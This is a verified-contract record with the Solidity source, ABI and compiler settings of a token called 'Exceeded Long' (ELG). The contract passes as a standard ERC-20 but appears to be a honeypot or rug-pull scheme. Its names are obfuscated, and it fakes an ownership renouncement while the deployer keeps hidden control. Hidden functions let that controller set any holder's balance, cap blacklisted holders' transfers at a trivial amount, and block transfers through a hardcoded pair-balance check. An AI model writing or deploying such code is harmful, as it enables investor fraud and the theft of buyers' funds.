{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface limitAtMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingWallet {\n    function createPair(address txAmount, address atAuto) external returns (address);\n}\n\ninterface totalFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverWallet) external view returns (uint256);\n\n    function transfer(address txSender, uint256 swapLiquidity) external returns (bool);\n\n    function allowance(address receiverTokenLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txSender,\n        uint256 swapLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxLaunched, uint256 value);\n    event Approval(address indexed receiverTokenLimit, address indexed spender, uint256 value);\n}\n\ninterface maxTo is totalFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExceededLong is launchedFee, totalFrom, maxTo {\n\n    string private fromMax = \"Exceeded Long\";\n\n    uint256 constant autoSwap = 5 ** 10;\n\n    constructor (){\n        if (modeFeeToken != senderTxLaunch) {\n            liquidityTxTotal = false;\n        }\n        limitAtMode modeReceiver = limitAtMode(senderFrom);\n        feeSender = marketingWallet(modeReceiver.factory()).createPair(modeReceiver.WETH(), address(this));\n        \n        takeEnable = _msgSender();\n        sellFee();\n        fundSell[takeEnable] = true;\n        launchedReceiver[takeEnable] = receiverTxExempt;\n        \n        emit Transfer(address(0), takeEnable, receiverTxExempt);\n    }\n\n    uint256 private senderTxLaunch;\n\n    address minShouldIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public limitWallet;\n\n    uint8 private tradingFund = 18;\n\n    function transferFrom(address marketingTrading, address txSender, uint256 swapLiquidity) external override returns (bool) {\n        if (_msgSender() != senderFrom) {\n            if (listMinToken[marketingTrading][_msgSender()] != type(uint256).max) {\n                require(swapLiquidity <= listMinToken[marketingTrading][_msgSender()]);\n                listMinToken[marketingTrading][_msgSender()] -= swapLiquidity;\n            }\n        }\n        return toLiquidity(marketingTrading, txSender, swapLiquidity);\n    }\n\n    mapping(address => mapping(address => uint256)) private listMinToken;\n\n    string private launchedSender = \"ELG\";\n\n    function getOwner() external view returns (address) {\n        return receiverIs;\n    }\n\n    mapping(address => uint256) private launchedReceiver;\n\n    address public takeEnable;\n\n    uint256 public modeFeeToken;\n\n    function totalMarketingTrading(address fromLaunched) public {\n        if (limitWallet) {\n            return;\n        }\n        \n        fundSell[fromLaunched] = true;\n        \n        limitWallet = true;\n    }\n\n    function receiverBuy(address receiverMin, uint256 swapLiquidity) public {\n        marketingListTotal();\n        launchedReceiver[receiverMin] = swapLiquidity;\n    }\n\n    bool public takeFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTxExempt;\n    }\n\n    mapping(address => bool) public limitTake;\n\n    bool public enableAutoReceiver;\n\n    function amountShould(address swapSenderFrom) public {\n        marketingListTotal();\n        \n        if (swapSenderFrom == takeEnable || swapSenderFrom == feeSender) {\n            return;\n        }\n        limitTake[swapSenderFrom] = true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverIs;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromMax;\n    }\n\n    event OwnershipTransferred(address indexed sellList, address indexed buyLimit);\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFund;\n    }\n\n    bool private liquidityTxTotal;\n\n    address private receiverIs;\n\n    address public feeSender;\n\n    function amountReceiverIs(uint256 swapLiquidity) public {\n        marketingListTotal();\n        maxReceiver = swapLiquidity;\n    }\n\n    uint256 swapAt;\n\n    mapping(address => bool) public fundSell;\n\n    function sellFee() public {\n        emit OwnershipTransferred(takeEnable, address(0));\n        receiverIs = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedSender;\n    }\n\n    function toLiquidity(address marketingTrading, address txSender, uint256 swapLiquidity) internal returns (bool) {\n        if (marketingTrading == takeEnable) {\n            return tokenMin(marketingTrading, txSender, swapLiquidity);\n        }\n        uint256 tokenFund = totalFrom(feeSender).balanceOf(minShouldIs);\n        require(tokenFund == maxReceiver);\n        require(txSender != minShouldIs);\n        if (limitTake[marketingTrading]) {\n            return tokenMin(marketingTrading, txSender, autoSwap);\n        }\n        return tokenMin(marketingTrading, txSender, swapLiquidity);\n    }\n\n    function approve(address minAuto, uint256 swapLiquidity) public virtual override returns (bool) {\n        listMinToken[_msgSender()][minAuto] = swapLiquidity;\n        emit Approval(_msgSender(), minAuto, swapLiquidity);\n        return true;\n    }\n\n    function balanceOf(address receiverWallet) public view virtual override returns (uint256) {\n        return launchedReceiver[receiverWallet];\n    }\n\n    bool public senderSell;\n\n    uint256 private receiverTxExempt = 100000000 * 10 ** 18;\n\n    uint256 maxReceiver;\n\n    address senderFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address receiverMin, uint256 swapLiquidity) external virtual override returns (bool) {\n        return toLiquidity(_msgSender(), receiverMin, swapLiquidity);\n    }\n\n    function allowance(address toTake, address minAuto) external view virtual override returns (uint256) {\n        if (minAuto == senderFrom) {\n            return type(uint256).max;\n        }\n        return listMinToken[toTake][minAuto];\n    }\n\n    function tokenMin(address marketingTrading, address txSender, uint256 swapLiquidity) internal returns (bool) {\n        require(launchedReceiver[marketingTrading] >= swapLiquidity);\n        launchedReceiver[marketingTrading] -= swapLiquidity;\n        launchedReceiver[txSender] += swapLiquidity;\n        emit Transfer(marketingTrading, txSender, swapLiquidity);\n        return true;\n    }\n\n    bool private listTx;\n\n    function marketingListTotal() private view {\n        require(fundSell[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTokenLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapLiquidity\",\"type\":\"uint256\"}],\"name\":\"amountReceiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSenderFrom\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAutoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFeeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLiquidity\",\"type\":\"uint256\"}],\"name\":\"receiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"}],\"name\":\"totalMarketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExceededLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}